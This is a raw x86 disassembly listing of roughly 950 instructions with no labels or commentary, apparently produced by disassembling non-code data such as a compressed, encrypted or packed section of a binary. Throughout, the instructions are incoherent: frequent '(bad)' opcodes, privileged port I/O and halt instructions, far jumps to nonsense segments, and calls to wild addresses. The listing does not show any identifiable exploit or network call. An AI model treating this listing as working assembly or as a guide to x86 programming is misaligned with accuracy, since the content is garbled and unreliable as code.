  42ce49:	add    BYTE PTR [ebx+0x44c1c80a],dl
  42ce4f:	sbb    eax,0x781b998
  42ce54:	xchg   edx,eax
  42ce55:	mov    edi,0x1d97debf
  42ce5a:	js     0x42ce1e
  42ce5c:	js     0x42ce5f
  42ce5e:	mov    eax,ds:0x7ea897f0
  42ce63:	and    esp,edx
  42ce65:	ins    BYTE PTR es:[edi],dx
  42ce66:	add    DWORD PTR [edi-0x1e80a3c9],esp
  42ce6c:	xchg   edi,eax
  42ce6d:	add    BYTE PTR [edi],cl
  42ce6f:	mov    ebx,0x8a4b73e1
  42ce74:	add    bh,bh
  42ce76:	adc    eax,0xb68d06d8
  42ce7b:	stos   BYTE PTR es:[edi],al
  42ce7c:	inc    DWORD PTR ds:[eax+ebx*4]
  42ce80:	add    BYTE PTR [eax-0x17],al
  42ce83:	xor    dl,al
  42ce85:	or     al,0x64
  42ce87:	repz pop edi
  42ce89:	or     DWORD PTR [edx-0xa],edi
  42ce8c:	add    edi,DWORD PTR [ebx]
  42ce8e:	dec    esp
  42ce8f:	or     esp,0xf42ebeb
  42ce95:	mov    ebp,DWORD PTR [edi+0x7eebd30b]
  42ce9b:	(bad)  
  42ce9c:	xchg   ecx,eax
  42ce9d:	ret    
  42ce9e:	into   
  42ce9f:	fisttp QWORD PTR [ecx+0x5b]
  42cea2:	rcr    ah,1
  42cea4:	stos   DWORD PTR es:[edi],eax
  42cea5:	push   ebx
  42cea6:	mul    esi
  42cea8:	xchg   ebx,eax
  42cea9:	repnz xor al,0xec
  42ceac:	pop    edi
  42cead:	sub    eax,0x0
  42ceb2:	add    BYTE PTR [eax*1-0x7ed6a0],dh
  42ceb9:	hlt    
  42ceba:	call   FWORD PTR [esi+0x7e85e437]
  42cec0:	test   DWORD PTR [edx],edx
  42cec2:	xor    bh,BYTE PTR [ecx]
  42cec4:	sysenter 
  42cec6:	push   esi
  42cec7:	add    ah,BYTE PTR [edi+eiz*4-0x68]
  42cecb:	imul   esi,DWORD PTR [ebx+0x46fe80e],0xebe2ffe9
  42ced5:	xchg   ecx,eax
  42ced6:	fadd   DWORD PTR [ecx+0x30]
  42ced9:	cmc    
  42ceda:	call   FWORD PTR [esi]
  42cedc:	xor    BYTE PTR [ebp+0xe8d6feb],ch
  42cee2:	xor    ecx,DWORD PTR [ebx]
  42cee4:	cmp    eax,0xb3290084
  42cee9:	not    BYTE PTR [ebx]
  42ceeb:	nop
  42ceec:	inc    eax
  42ceed:	enter  0xcffa,0xcf
  42cef1:	sub    edi,DWORD PTR [edi+0x50f6a4bd]
  42cef7:	rol    edi,0x1f
  42cefa:	xchg   DWORD PTR [ecx],ebx
  42cefc:	xchg   esi,eax
  42cefd:	sbb    eax,0x128249fc
  42cf02:	add    BYTE PTR [eax-0x7c67f],dl
  42cf08:	jg     0x42cea5
  42cf0a:	out    dx,eax
  42cf0b:	or     eax,0x1b133e7f
  42cf10:	push   esi
  42cf11:	les    esp,FWORD PTR [ebp+0x7f]
  42cf14:	sbb    al,0xa2
  42cf16:	pop    eax
  42cf17:	add    BYTE PTR [eax],al
  42cf19:	add    BYTE PTR [eax],al
  42cf1b:	add    bh,ah
  42cf1d:	(bad)  [ebp+0xb125dcd]
  42cf23:	dec    ebp
  42cf24:	int3   
  42cf25:	pop    edx
  42cf26:	in     al,dx
  42cf27:	mov    BYTE PTR [edi-0x3178e63c],cl
  42cf2d:	ror    BYTE PTR [edi+eiz*8],0xb7
  42cf31:	mov    DWORD PTR [ebx],0xd0944ff2
  42cf37:	pop    ecx
  42cf38:	fxch   st(3)
  42cf3a:	and    edx,DWORD PTR [edx+0x47]
  42cf3d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42cf3e:	les    eax,FWORD PTR [ecx+ecx*8-0x797b0064]
  42cf45:	test   al,0x33
  42cf47:	addr16 jle 0x42cf67
  42cf4a:	popf   
  42cf4b:	shr    DWORD PTR [eax+0x6f],1
  42cf4e:	sti    
  42cf4f:	cli    
  42cf50:	ja     0x42cee3
  42cf52:	mov    DWORD PTR [edi+ebp*2+0x4b2e0e87],0xb523801
  42cf5d:	inc    ebp
  42cf5e:	mov    ebx,DWORD PTR [eax-0x17eff470]
  42cf64:	das    
  42cf65:	leavew 
  42cf67:	cli    
  42cf68:	sbb    esi,DWORD PTR [ebx+0xb678da4]
  42cf6e:	mov    cl,0xed
  42cf70:	cmp    bl,BYTE PTR [esi]
  42cf72:	xchg   ecx,eax
  42cf73:	repz mov ch,0xb2
  42cf76:	enter  0xe8b5,0x3b
  42cf7a:	test   BYTE PTR [ebx],0x90
  42cf7d:	or     dh,BYTE PTR [ecx+edx*8+0x0]
  42cf81:	add    BYTE PTR [eax],al
  42cf83:	add    BYTE PTR [eax],al
  42cf85:	sbb    bl,BYTE PTR [esi]
  42cf87:	jo     0x42cf44
  42cf89:	push   0x7c
  42cf8b:	outs   dx,DWORD PTR ds:[esi]
  42cf8c:	(bad)  
  42cf8d:	pop    esi
  42cf8e:	icebp  
  42cf8f:	stos   BYTE PTR es:[edi],al
  42cf90:	mov    gs,ebx
  42cf92:	and    DWORD PTR [esi+0x3f296331],0xffffff88
  42cf99:	inc    esp
  42cf9a:	push   ds
  42cf9b:	jg     0x42d01a
  42cf9d:	out    0x1d,eax
  42cf9f:	imul   bl
  42cfa1:	pop    es
  42cfa2:	es sub eax,0x7b230eda
  42cfa8:	rol    DWORD PTR [ebx-0x45],1
  42cfab:	jo     0x42cfed
  42cfad:	(bad)
  42cfb1:	out    0xb3,al
  42cfb3:	cmc    
  42cfb4:	add    eax,ebx
  42cfb6:	and    edi,DWORD PTR [ebx-0x4b]
  42cfb9:	and    al,0xab
  42cfbb:	mov    esi,0xf9a0a448
  42cfc0:	mov    WORD PTR [edx-0x367120f7],ss
  42cfc6:	or     bl,BYTE PTR [ebp-0x13]
  42cfc9:	mov    bl,BYTE PTR ds:0x29ead1a9
  42cfcf:	mov    esp,0x28f1493a
  42cfd4:	xor    ah,bl
  42cfd6:	sub    eax,ecx
  42cfd8:	jg     0x42d032
  42cfda:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfdb:	or     BYTE PTR [edi+0x61],bh
  42cfde:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42cfdf:	add    al,0x6b
  42cfe1:	(bad)  
  42cfe2:	stc    
  42cfe3:	test   BYTE PTR [ebx],0x90
  42cfe6:	sub    DWORD PTR [edi],ecx
  42cfe8:	lahf   
  42cfe9:	add    BYTE PTR [eax],al
  42cfeb:	add    BYTE PTR [eax],al
  42cfed:	add    BYTE PTR [eax+eax*1],bh
  42cff0:	stc    
  42cff1:	scas   al,BYTE PTR es:[edi]
  42cff2:	imul   esi,DWORD PTR [edi+eiz*8],0x12a6596c
  42cff9:	fcomi  st,st(4)
  42cffb:	adc    esi,DWORD PTR [edi]
  42cffd:	aas    
  42cffe:	sbb    eax,0x8c73a600
  42d003:	mov    dl,0xe
  42d005:	xchg   ecx,eax
  42d006:	mov    esp,DWORD PTR [eax]
  42d008:	in     al,dx
  42d009:	jle    0x42d010
  42d00b:	call   0x963f61a8
  42d010:	clc    
  42d011:	outs   dx,BYTE PTR ds:[esi]
  42d012:	jmp    0x9415cf2a
  42d017:	int    0xc0
  42d019:	mov    al,ds:0xe9ec1d76
  42d01e:	sti    
  42d01f:	or     al,0xe2
  42d021:	dec    esi
  42d022:	leave  
  42d023:	ss (bad) 
  42d025:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d026:	cdq    
  42d027:	xor    al,0xd0
  42d029:	mov    ds:0x459785cc,al
  42d02e:	add    DWORD PTR [ebx+0x1a149644],0xffffff9a
  42d035:	mov    esp,0xe98559e7
  42d03a:	xchg   ebx,eax
  42d03b:	mov    dl,0xf6
  42d03d:	jmp    0x42cfff
  42d03f:	pop    ss
  42d040:	in     al,dx
  42d041:	bound  edi,QWORD PTR [ebp+esi*1+0x33a07de5]
  42d048:	push   edx
  42d049:	std    
  42d04a:	and    eax,0xcb1b1fda
  42d04f:	pop    ds
  42d050:	fisub  WORD PTR [eax+eax*1+0x0]
  42d054:	add    BYTE PTR [eax],al
  42d056:	add    BYTE PTR [esi],bh
  42d058:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d059:	adc    eax,0x611ed720
  42d05e:	in     eax,0xa
  42d060:	mov    cl,0xf7
  42d062:	loopne 0x42d080
  42d064:	jmp    0xec:0x1975faf6
  42d06b:	pop    edx
  42d06c:	add    cl,BYTE PTR [ecx-0x75]
  42d06f:	das    
  42d070:	fcmovbe st,st(5)
  42d072:	ret    
  42d073:	lods   al,BYTE PTR ds:[esi]
  42d074:	sub    eax,0xe0a851f8
  42d079:	aas    
  42d07a:	push   0xffffff8d
  42d07c:	sub    eax,0xfa7c8de7
  42d081:	inc    esi
  42d082:	call   0x2bd282
  42d087:	mov    dl,0xff
  42d089:	xchg   edx,eax
  42d08a:	neg    BYTE PTR ds:0x95459523
  42d090:	lea    esp,[ebx+esi*1]
  42d093:	sub    ebx,ecx
  42d095:	fcomip st,st(1)
  42d097:	ins    BYTE PTR es:[edi],dx
  42d098:	arpl   WORD PTR gs:[ecx],cx
  42d09b:	mov    al,0x73
  42d09d:	jmp    0xf0eb:0x1128ed72
  42d0a4:	cs (bad) 
  42d0a6:	call   0x2bd955
  42d0ab:	fiadd  DWORD PTR [ecx]
  42d0ad:	dec    ecx
  42d0ae:	mov    ebp,DWORD PTR [edi+0x2cc3d5d9]
  42d0b4:	das    
  42d0b5:	clc    
  42d0b6:	or     DWORD PTR [ebp-0x9],0x3e
  42d0ba:	push   ebx
  42d0bb:	add    BYTE PTR [eax],al
  42d0bd:	add    BYTE PTR [eax],al
  42d0bf:	add    bh,bh
  42d0c1:	loop   0x42d056
  42d0c3:	repnz sub al,0xe8
  42d0c6:	pop    edi
  42d0c7:	cs cmp al,0x1
  42d0ca:	pusha  
  42d0cb:	sub    dl,BYTE PTR [edx]
  42d0cd:	add    ah,BYTE PTR [edx]
  42d0cf:	mov    edi,DWORD PTR [edi+0x7]
  42d0d2:	jmp    0x954667c0
  42d0d7:	clc    
  42d0d8:	cld    
  42d0d9:	cli    
  42d0da:	bound  eax,QWORD PTR [ebx+ecx*2]
  42d0dd:	pop    esi
  42d0de:	cmc    
  42d0df:	and    al,0xbf
  42d0e1:	mov    BYTE PTR [edx-0x75],dh
  42d0e4:	ds (bad) 
  42d0e7:	xor    edx,DWORD PTR [eax+0x1bfac3fe]
  42d0ed:	cmp    al,0x99
  42d0ef:	xlat   BYTE PTR ds:[ebx]
  42d0f0:	push   0x57faf9a4
  42d0f5:	add    BYTE PTR ds:0x6e6f9066,dl
  42d0fb:	das    
  42d0fc:	(bad)  
  42d0fe:	cli    
  42d0ff:	sbb    eax,DWORD PTR [ebp+0x54]
  42d102:	les    eax,FWORD PTR [ebp-0x79db23a8]
  42d108:	push   ebx
  42d109:	loopne 0x42d0a2
  42d10b:	in     al,0xc5
  42d10d:	dec    eax
  42d10e:	nop
  42d10f:	jnp    0x42d185
  42d111:	or     eax,0xa06d7410
  42d116:	push   ecx
  42d117:	or     BYTE PTR ds:0xc31a3f49,dl
  42d11d:	push   edx
  42d11e:	xchg   ebx,eax
  42d11f:	aaa    
  42d120:	nop
  42d121:	(bad)  
  42d122:	push   ss
  42d123:	add    BYTE PTR [eax],0x0
  42d126:	add    BYTE PTR [eax],al
  42d128:	add    BYTE PTR [eax+0xa],bh
  42d12b:	adc    BYTE PTR [ebp+ebx*4+0x4a],dh
  42d12f:	or     DWORD PTR [esp+ebp*4+0x15],ecx
  42d133:	pop    esp
  42d134:	call   FWORD PTR [edi-0x14c00880]
  42d13a:	adc    eax,DWORD PTR [ecx]
  42d13c:	sar    BYTE PTR [ebx-0x67bf66f9],0xc7
  42d143:	push   cs
  42d144:	add    BYTE PTR [edi-0x60],ah
  42d147:	leave  
  42d148:	jg     0x42d1c1
  42d14a:	or     DWORD PTR [esp+eax*1+0x62],ebx
  42d14e:	leave  
  42d14f:	neg    DWORD PTR [edx+0x3d]
  42d152:	lods   al,BYTE PTR ds:[esi]
  42d153:	ds and al,0x8c
  42d156:	ror    DWORD PTR [edx-0x66e46806],0xe7
  42d15d:	adc    eax,0xc2043daf
  42d162:	retf   
  42d163:	test   DWORD PTR [ebp-0x1d],0x448b2bb2
  42d16a:	or     esi,ebp
  42d16c:	outs   dx,BYTE PTR ds:[esi]
  42d16d:	outs   dx,DWORD PTR ds:[esi]
  42d16e:	sbb    dh,BYTE PTR [ecx+0x46]
  42d171:	mov    WORD PTR [edi],fs
  42d173:	inc    esi
  42d174:	add    eax,0x88dd7a0d
  42d179:	or     eax,0x0
  42d17c:	retf   0xad4e
  42d17f:	push   es
  42d180:	xor    bl,ch
  42d182:	sbb    ebx,eax
  42d184:	aaa    
  42d185:	mov    ds:0xc32cf572,al
  42d18a:	scas   al,BYTE PTR es:[edi]
  42d18b:	pusha  
  42d18c:	add    BYTE PTR cs:[eax],al
  42d18f:	add    BYTE PTR [eax],al
  42d191:	add    BYTE PTR [ebp+esi*1+0x1ca707ba],dl
  42d198:	not    DWORD PTR [eax-0x75]
  42d19b:	sub    eax,0xb24ebe1
  42d1a0:	ins    DWORD PTR es:[edi],dx
  42d1a1:	(bad)  
  42d1a2:	mov    ss,ebp
  42d1a4:	cmc    
  42d1a5:	(bad)  
  42d1a6:	pop    edx
  42d1a7:	scas   al,BYTE PTR es:[edi]
  42d1a8:	nop
  42d1a9:	(bad)  
  42d1aa:	push   ss
  42d1ab:	out    dx,al
  42d1ac:	cmp    eax,0x4d19e822
  42d1b1:	xor    eax,0x38a0b420
  42d1b6:	dec    ebx
  42d1b7:	hlt    
  42d1b8:	icebp  
  42d1b9:	add    ebx,DWORD PTR [edi+0x6]
  42d1bc:	(bad)  
  42d1bd:	xor    bh,BYTE PTR ds:0xac1fda2d
  42d1c3:	or     BYTE PTR [edx+edx*1+0x7fff2dcb],0xac
  42d1cb:	sahf   
  42d1cc:	mov    ds:0xe1ce5388,eax
  42d1d1:	xor    eax,DWORD PTR [ebx-0x76]
  42d1d4:	sub    eax,0x70b29003
  42d1d9:	enter  0x1cb7,0xa8
  42d1dd:	add    edx,DWORD PTR [eax+0x38be62d]
  42d1e3:	iret   
  42d1e4:	push   cs
  42d1e5:	aad    0x10
  42d1e7:	and    esp,DWORD PTR [ebx-0x3d]
  42d1ea:	or     dh,BYTE PTR [ebp+0x32]
  42d1ed:	std    
  42d1ee:	jmp    0x536517b8
  42d1f3:	xchg   DWORD PTR [ebx],ecx
  42d1f5:	sbb    al,BYTE PTR [eax]
  42d1f7:	add    BYTE PTR [eax],al
  42d1f9:	add    BYTE PTR [eax],al
  42d1fb:	and    ah,BYTE PTR [esi+ebx*8]
  42d1fe:	pusha  
  42d1ff:	ror    dh,1
  42d201:	add    ch,BYTE PTR [edx+eiz*1-0x62]
  42d205:	jmp    FWORD PTR [ebx-0x30]
  42d208:	into   
  42d209:	push   es
  42d20a:	sbb    DWORD PTR [ebp-0x70],esi
  42d20d:	jb     0x42d271
  42d20f:	push   edi
  42d210:	adc    ecx,ebx
  42d212:	fist   DWORD PTR [ebx+0x399197b2]
  42d218:	enter  0xa18f,0x3d
  42d21c:	or     ah,BYTE PTR [ebx-0x18]
  42d21f:	xchg   ebx,eax
  42d220:	mov    dl,0x99
  42d222:	xor    eax,0x76f6be70
  42d227:	call   0xdca5be47
  42d22c:	sub    DWORD PTR [ebx-0x3b],esp
  42d22f:	pop    es
  42d230:	cs in  eax,0xdd
  42d233:	(bad)  
  42d234:	and    eax,0x59ec0543
  42d239:	xchg   ecx,ebp
  42d23b:	xchg   ebx,eax
  42d23c:	mov    dl,0xf6
  42d23e:	out    dx,eax
  42d23f:	into   
  42d240:	sbb    ebp,esp
  42d242:	jb     0x42d228
  42d244:	das    
  42d245:	push   ebx
  42d246:	add    eax,0xd5329c0
  42d24b:	shr    BYTE PTR ds:0xcd3fdefa,0xd
  42d252:	jmp    0xc59603ea
  42d257:	stos   DWORD PTR es:[edi],eax
  42d258:	xchg   edi,eax
  42d259:	out    0xd9,al
  42d25b:	mov    WORD PTR [eax+0xe80b],ds
  42d261:	add    BYTE PTR [eax],al
  42d263:	add    BYTE PTR [ebx+0x790097b2],dl
  42d269:	sub    ebx,ebx
  42d26b:	call   0x51ab0a
  42d270:	hlt    
  42d271:	out    dx,al
  42d272:	sbb    BYTE PTR [esi+0xeb55f],cl
  42d278:	mov    al,0x7a
  42d27a:	xor    ah,BYTE PTR [eax*8+0x328b41b8]
  42d281:	or     al,0x82
  42d283:	push   es
  42d284:	imul   esi,DWORD PTR [edx+edx*4-0x1b67a140],0x93b43900
  42d28f:	push   esp
  42d290:	xchg   ebp,eax
  42d291:	and    dl,BYTE PTR [ebp-0x179bae32]
  42d297:	(bad)  
  42d298:	out    dx,al
  42d299:	sub    al,BYTE PTR [eax+0x24]
  42d29c:	xchg   ecx,eax
  42d29d:	sub    ebx,ebx
  42d29f:	call   0x2bd2e6
  42d2a4:	mov    dl,0x6f
  42d2a6:	xor    dl,BYTE PTR [edx+eax*4]
  42d2a9:	jmp    0x42d2c2
  42d2ab:	test   DWORD PTR [eax-0x51],eax
  42d2ae:	xchg   edx,eax
  42d2af:	leave  
  42d2b0:	stc    
  42d2b1:	mov    bl,0xe
  42d2b3:	call   0x2bc978
  42d2b8:	adc    bh,0x32
  42d2bb:	and    al,0x74
  42d2bd:	repz sbb BYTE PTR [ecx+eax*1+0x3c000eb4],al
  42d2c5:	adc    BYTE PTR [edx],0x56
  42d2c8:	add    BYTE PTR [eax],al
  42d2ca:	add    BYTE PTR [eax],al
  42d2cc:	add    BYTE PTR [esi+0x8],cl
  42d2cf:	cld    
  42d2d0:	adc    bh,cl
  42d2d2:	mov    bl,0x93
  42d2d4:	retf   
  42d2d5:	push   ecx
  42d2d6:	mov    ch,0xeb
  42d2d8:	jmp    FWORD PTR [ecx-0x4adbafd6]
  42d2de:	sub    bl,BYTE PTR [eax+0x24]
  42d2e1:	lods   eax,DWORD PTR ds:[esi]
  42d2e2:	sub    al,0x2d
  42d2e4:	sub    BYTE PTR [eax+0x74242b94],dl
  42d2ea:	xchg   edx,eax
  42d2eb:	push   esi
  42d2ec:	and    al,0x9
  42d2ee:	dec    ebp
  42d2ef:	xor    al,0xe8
  42d2f1:	push   edi
  42d2f2:	gs ret 0xc3fa
  42d2f6:	mov    ebx,0xfdb473da
  42d2fb:	xchg   esi,eax
  42d2fc:	inc    ebx
  42d2fd:	lods   al,BYTE PTR ds:[esi]
  42d2fe:	mov    cl,0x69
  42d300:	mov    di,ds
  42d303:	imul   edi,DWORD PTR [esi],0x243e92b0
  42d309:	mov    al,0x94
  42d30b:	out    dx,eax
  42d30c:	mov    bl,al
  42d30e:	sbb    ecx,eax
  42d310:	adc    al,0x38
  42d312:	sti    
  42d313:	dec    edi
  42d314:	add    BYTE PTR [ecx-0x5e8ae51c],cl
  42d31a:	shl    BYTE PTR [edi],0x53
  42d31d:	fist   WORD PTR [eax-0x1a]
  42d320:	repz or cl,0x12
  42d324:	mov    ebx,edx
  42d326:	add    DWORD PTR [edi-0x401f5b41],edx
  42d32c:	outs   dx,BYTE PTR ds:[esi]
  42d32d:	pop    eax
  42d32e:	xor    dh,ah
  42d330:	das    
  42d331:	add    BYTE PTR [eax],al
  42d333:	add    BYTE PTR [eax],al
  42d335:	add    BYTE PTR [ebx-0x7c72ed37],ah
  42d33b:	push   ebp
  42d33c:	sbb    edi,DWORD PTR [edx]
  42d33e:	test   dl,dh
  42d340:	mov    es,WORD PTR [ebx-0x54]
  42d343:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d344:	and    bh,bl
  42d346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42d347:	js     0x42d32e
  42d349:	xchg   ebx,eax
  42d34a:	or     DWORD PTR [ecx+0x10],0xe3fcd085
  42d351:	adc    BYTE PTR [ebp+eiz*4+0x36],0xff
  42d356:	nop
  42d357:	or     DWORD PTR [eax],edx
  42d359:	je     0x42d2f5
  42d35b:	loopne 0x42d365
  42d35d:	sti    
  42d35e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d35f:	jmp    0xb2d31345
  42d364:	pop    esi
  42d365:	adc    ch,BYTE PTR [ecx-0x28]
  42d368:	and    BYTE PTR [esi],0xf
  42d36b:	mov    bl,0xab
  42d36d:	xor    al,0x17
  42d36f:	sub    ah,BYTE PTR [edx+0x5]
  42d372:	nop
  42d373:	mov    dl,0x88
  42d375:	pop    ebx
  42d376:	popf   
  42d377:	push   ecx
  42d378:	mov    eax,0xf5b2f803
  42d37d:	sti    
  42d37e:	jg     0x42d38e
  42d380:	pop    ebp
  42d381:	xchg   esp,eax
  42d382:	ja     0x42d39a
  42d384:	jp     0x42d349
  42d386:	in     al,0xaf
  42d388:	aas    
  42d389:	ror    dl,cl
  42d38b:	or     esi,ebp
  42d38d:	push   ss
  42d38e:	pop    ebx
  42d38f:	outs   dx,BYTE PTR ds:[esi]
  42d390:	rol    BYTE PTR [esi],1
  42d392:	xlat   BYTE PTR ds:[ebx]
  42d393:	in     eax,0xd4
  42d395:	jle    0x42d372
  42d397:	into   
  42d398:	leave  
  42d399:	fild   DWORD PTR [eax]
  42d39b:	add    BYTE PTR [eax],al
  42d39d:	add    BYTE PTR [eax],al
  42d39f:	cwde   
  42d3a0:	or     eax,0xe816d2a5
  42d3a5:	int    0x5
  42d3a7:	xor    edx,DWORD PTR [esi]
  42d3a9:	mov    ch,0x7e
  42d3ab:	push   edx
  42d3ac:	jbe    0x42d3d9
  42d3ae:	xor    DWORD PTR [edi-0x220c45cf],edi
  42d3b4:	scas   al,BYTE PTR es:[edi]
  42d3b5:	cmc    
  42d3b6:	xor    al,0xc7
  42d3b8:	jg     0x42d3c5
  42d3ba:	cmp    edx,DWORD PTR [edi]
  42d3bc:	sbb    al,0x7b
  42d3be:	pop    edx
  42d3bf:	mov    WORD PTR [esp+eiz*2-0x8],?
  42d3c3:	out    dx,eax
  42d3c4:	shl    BYTE PTR ds:0x2ef9a704,0x33
  42d3cb:	mov    ah,0x9e
  42d3cd:	mov    edi,0x7aca527e
  42d3d2:	ret    
  42d3d3:	arpl   WORD PTR [ecx-0x3d53d092],dx
  42d3d9:	push   esp
  42d3da:	dec    edx
  42d3db:	sub    BYTE PTR [ecx],0xb5
  42d3de:	adc    esi,DWORD PTR [edi+0x0]
  42d3e1:	(bad)  
  42d3e3:	pop    edx
  42d3e4:	retf   0x4397
  42d3e7:	xor    al,0x88
  42d3e9:	push   ds
  42d3ea:	xchg   edx,eax
  42d3eb:	mov    al,0xa9
  42d3ed:	jle    0xe18caf7a
  42d3f3:	inc    edi
  42d3f4:	retf   
  42d3f5:	jmp    0x42d3eb
  42d3f7:	scas   eax,DWORD PTR es:[edi]
  42d3f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42d3f9:	dec    esi
  42d3fa:	jmp    0xbc5943ad
  42d3ff:	jae    0x42d425
  42d401:	adc    ebp,ecx
  42d403:	add    BYTE PTR [eax],al
  42d405:	add    BYTE PTR [eax],al
  42d407:	add    dh,ah
  42d409:	ret    0x9d97
  42d40c:	scas   eax,DWORD PTR es:[edi]
  42d40d:	ret    0x704d
  42d410:	ror    dh,1
  42d412:	(bad)  
  42d413:	and    ecx,edx
  42d415:	retf   0xae60
  42d418:	cmp    eax,0x8c2c95d1
  42d41d:	sub    ecx,DWORD PTR [edx-0x13]
  42d420:	retf   0x1676
  42d423:	jb     0x42d3fe
  42d425:	loop   0x42d49e
  42d427:	test   eax,0x5551439
  42d42c:	(bad)  
  42d42d:	sar    DWORD PTR [esi],0xa6
  42d430:	enter  0x2ece,0x9e
  42d434:	pop    ds
  42d435:	jns    0x42d43b
  42d437:	sub    DWORD PTR [ebp+edx*4-0x4e03222e],edx
  42d43e:	inc    esp
  42d43f:	xchg   BYTE PTR [edi],al
  42d441:	or     eax,0x798c2901
  42d446:	dec    esp
  42d447:	adc    al,0x7e
  42d449:	push   esp
  42d44a:	dec    eax
  42d44b:	adc    dh,cl
  42d44d:	mov    al,0xe
  42d44f:	push   0xfffffff0
  42d451:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42d452:	aas    
  42d453:	mov    ah,0xa9
  42d455:	adc    DWORD PTR [edi-0x140279a8],0x4ea6eff4
  42d45f:	add    BYTE PTR [ecx+0x1e046593],bh
  42d465:	cwde   
  42d466:	dec    edi
  42d467:	and    al,0xe1
  42d469:	xchg   edi,eax
  42d46a:	addr16 and al,0x0
  42d46d:	add    BYTE PTR [eax],al
  42d46f:	add    BYTE PTR [eax],al
  42d471:	mov    DWORD PTR [ebx],eax
  42d473:	add    esi,eax
  42d475:	stos   DWORD PTR es:[edi],eax
  42d476:	jo     0x42d486
  42d478:	xor    edx,DWORD PTR [ecx+ebp*4+0x2ab62878]
  42d47f:	add    BYTE PTR [eax],0xa9
  42d482:	mov    al,0x93
  42d484:	push   esp
  42d485:	pop    ebp
  42d486:	int3   
  42d487:	sub    eax,0x94cc4d6c
  42d48c:	jl     0x42d4db
  42d48e:	mov    eax,0x1c4d7c93
  42d493:	ins    DWORD PTR es:[edi],dx
  42d494:	ret    0xbf7d
  42d497:	aad    0x89
  42d499:	popf   
  42d49a:	retf   0x8906
  42d49d:	mov    ch,0xca
  42d49f:	dec    BYTE PTR [edx-0x3f943551]
  42d4a5:	cmp    eax,0xf8031b76
  42d4aa:	fistp  WORD PTR [edi+edi*8+0x5c]
  42d4ae:	mov    WORD PTR [eax],es
  42d4b0:	inc    eax
  42d4b1:	sub    DWORD PTR [edi],ebp
  42d4b3:	ror    BYTE PTR [esp+edi*4],1
  42d4b6:	out    dx,eax
  42d4b7:	bound  eax,QWORD PTR [eax-0x5e]
  42d4ba:	jno    0x42d4f6
  42d4bc:	add    esi,DWORD PTR [ebp-0x36]
  42d4bf:	xor    al,BYTE PTR [esi+eax*1-0x776eb83]
  42d4c6:	cwde   
  42d4c7:	dec    esi
  42d4c8:	add    al,0x80
  42d4ca:	jo     0x42d4e2
  42d4cc:	jmp    0x42d49e
  42d4ce:	cs daa 
  42d4d0:	add    ch,bh
  42d4d2:	push   ss
  42d4d3:	xchg   ebp,eax
  42d4d4:	mov    DWORD PTR [eax],0x0
  42d4da:	sub    BYTE PTR [edi-0x501577d7],0xe
  42d4e1:	jb     0x42d473
  42d4e3:	and    BYTE PTR [edi+0x14ef8c40],bh
  42d4e9:	pop    eax
  42d4ea:	sbb    DWORD PTR [ebx+0x578c4117],esi
  42d4f0:	call   0x69540e7d
  42d4f5:	inc    eax
  42d4f6:	mov    WORD PTR [eax+0x13],?
  42d4f9:	jg     0x42d52c
  42d4fb:	and    DWORD PTR [eax],edx
  42d4fd:	scas   eax,DWORD PTR es:[edi]
  42d4fe:	xchg   ecx,eax
  42d4ff:	mov    al,ds:0x8880242b
  42d504:	push   ebx
  42d505:	and    al,0x6c
  42d507:	cmc    
  42d508:	push   0x53
  42d50a:	mov    ah,0x11
  42d50c:	push   ebp
  42d50d:	jg     0x42d560
  42d50f:	cld    
  42d510:	push   0x1af9b44b
  42d515:	push   0xffffffa8
  42d517:	xchg   edi,eax
  42d518:	ins    BYTE PTR es:[edi],dx
  42d519:	xchg   ah,ch
  42d51b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42d51c:	ficom  WORD PTR [edx+0x67]
  42d51f:	push   ds
  42d520:	enter  0xd00d,0x9
  42d524:	cmp    eax,0xcf8fb55a
  42d529:	push   esi
  42d52a:	adc    eax,DWORD PTR [ebp-0x1d]
  42d52d:	mov    ebp,0x87270998
  42d532:	sub    al,0x88
  42d534:	div    bh
  42d536:	adc    edx,DWORD PTR [ebp-0x1d]
  42d539:	dec    esi
  42d53a:	(bad)
  42d53d:	lock add BYTE PTR [eax],al
  42d540:	add    BYTE PTR [eax],al
  42d542:	add    BYTE PTR [edi+0x4f7f14a0],bh
  42d548:	cmp    al,0x68
  42d54a:	jg     0x42d540
  42d54c:	or     DWORD PTR [eax],edx
  42d54e:	add    BYTE PTR [ecx],bl
  42d550:	lds    esi,FWORD PTR [esi]
  42d552:	sbb    BYTE PTR [ebx],bl
  42d554:	retf   
  42d555:	sbb    cl,BYTE PTR [ecx+0x52fbe554]
  42d55b:	push   0x9
  42d55d:	pop    DWORD PTR [ebx-0x4c]
  42d560:	mov    dl,0x15
  42d562:	xor    al,0x6e
  42d564:	mov    al,0x4c
  42d566:	stc    
  42d567:	pop    ss
  42d568:	shl    DWORD PTR [ebp-0x94f6afd],0x3
  42d56f:	nop
  42d570:	sahf   
  42d571:	fiadd  WORD PTR [edx-0x77034f41]
  42d577:	push   cs
  42d578:	mov    dl,0xf5
  42d57a:	add    eax,DWORD PTR ds:0xc712f184
  42d580:	rcl    cl,1
  42d582:	daa    
  42d583:	jl     0x42d602
  42d585:	or     al,0xf9
  42d587:	scas   eax,DWORD PTR es:[edi]
  42d588:	mov    edi,0x640f03b5
  42d58d:	stc    
  42d58e:	mov    BYTE PTR [eax-0x79],bl
  42d591:	aad    0x7a
  42d593:	loope  0x42d567
  42d595:	jb     0x42d549
  42d597:	add    ebp,DWORD PTR [ebp+ecx*1-0x2ed92b4]
  42d59e:	jp     0x42d5e7
  42d5a0:	ds cmp al,0x24
  42d5a3:	sbb    DWORD PTR [edi+0x11],esi
  42d5a6:	clc    
  42d5a7:	add    BYTE PTR [eax],al
  42d5a9:	add    BYTE PTR [eax],al
  42d5ab:	add    BYTE PTR [esi+ebp*8],dl
  42d5ae:	dec    edx
  42d5af:	cli    
  42d5b0:	sbb    dh,BYTE PTR [ebx]
  42d5b2:	or     eax,0xf91d4ff2
